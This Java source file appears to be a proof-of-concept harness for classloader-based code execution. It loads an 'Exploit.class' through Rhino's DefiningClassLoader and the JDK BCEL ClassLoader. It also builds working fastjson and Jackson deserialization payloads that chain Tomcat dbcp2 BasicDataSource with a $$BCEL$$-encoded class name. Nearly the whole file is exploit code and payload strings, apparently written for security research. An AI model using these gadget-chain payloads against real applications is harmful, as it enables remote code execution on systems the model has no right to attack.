package classloader.proj;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Scanner;

import com.alibaba.fastjson.JSON;
import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;
//import com.sun.org.apache.bcel.internal.util.ClassLoader;
import org.mozilla.javascript.DefiningClassLoader;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

public class MainTest {

	private static String readClass(String cls) {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		try {
			IOUtils.copy(new FileInputStream(new File(cls)), bos);
		} catch (IOException e) {
			e.printStackTrace();
		}
		return Base64.encodeBase64String(bos.toByteArray());
	}

	private static String getEvilClassPath() {
		return System.getProperty("user.dir") + "/target/classes/classloader/proj/Exploit.class";
	}

	// use mozilla (js-1.7R2.jar) DefiningClassLoader to load byte string of class,
	// which encoded by base64
	private static void mozilla_definingClassLoader() throws Exception {
		String evilCode = readClass(getEvilClassPath());

		// rhino js : org.mozilla.javascript.DefiningClassLoader
		DefiningClassLoader dcl = new DefiningClassLoader();
		Class<?> c = dcl.defineClass("classloader.proj.Exploit", Base64.decodeBase64(evilCode));
		c.newInstance();
	}

	// use jdk bcel ClassLoader to load soecial encoded class name of byte string of
	// class
	@SuppressWarnings("restriction")
	private static void bcel_definingClassLoader() throws Exception {
		// jdk rt.jar: com.sun.org.apache.bcel.internal.util.ClassLoader
		String encodedClassName = "$$BCEL$$" + BcelEncode.encode(getEvilClassPath());
		System.out.println(encodedClassName);
		Class.forName(encodedClassName, true, new com.sun.org.apache.bcel.internal.util.ClassLoader());
	}

	private static void fastjson_deserialize() throws Exception {
		String poc = "{\n" 
				+ "    {\n" 
				+ "        \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" 
				+ "        \"d\":\n"
				+ "        {\n" 
				+ "            \"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n"
				+ "            \"driverClassLoader\":\n" 
				+ "            {\n"
				+ "                \"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\",\n"
				+ "            },\n" 
				+ "            \"driverClassName\":\n"
				+ "                 \"$$BCEL$$" + BcelEncode.encode(getEvilClassPath()) + "\"\n"
				+ "        }\n" 
				+ "    }:\"ddd\"\n" 
				+ "}";
		System.out.println(poc);
		Object json = JSON.parse(poc);
		System.out.println(json.toString());
	}

	private static void jackson_deserialize() throws Exception {
		String poc = "{\n" 
				+ "    \"@class\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" 
				+ "    \"driverClassName\":\n"
				+ "       \"org.apache.log4j.spi$$BCEL$$" + BcelEncode.encode(getEvilClassPath()) + "\",\n"
				+ "    \"driverClassLoader\":\n" 
				+ "     {\n" 
				+ "          \"@class\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" 
				+ "     },\n"
				+ "     \"logWriter\":null\n" 
				+ "}";
		System.out.println(poc);
		ObjectMapper om = new ObjectMapper();
		om.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT, JsonTypeInfo.As.PROPERTY);
		om.readValue(poc.getBytes(), Object.class);

	}

	public static void main(String[] args) throws Exception {
		Scanner sc = new Scanner(System.in);

		while (true) {
			System.out.println("" 
					+ "[1]: mozilla\n" 
					+ "[2]: bcel\n" 
					+ "[3]: fastjson\n" 
					+ "[4]: jackson\n"
					+ "Your Choice is [1-4, 0 for quit]: ");
			String choice = sc.nextLine();
			//try {
				switch (choice) {
				case "1":
					mozilla_definingClassLoader();
					break;
				case "2":
					bcel_definingClassLoader();
					break;
				case "3":
					fastjson_deserialize();
					break;
				case "4":
					jackson_deserialize();
					break;
				case "0":
				case "q":
				default:
					System.out.println("Finished.");
					sc.close();
					return;
				}
			//} catch (Exception e) {
			//	System.out.println(e);
			//}
		}

	}

}
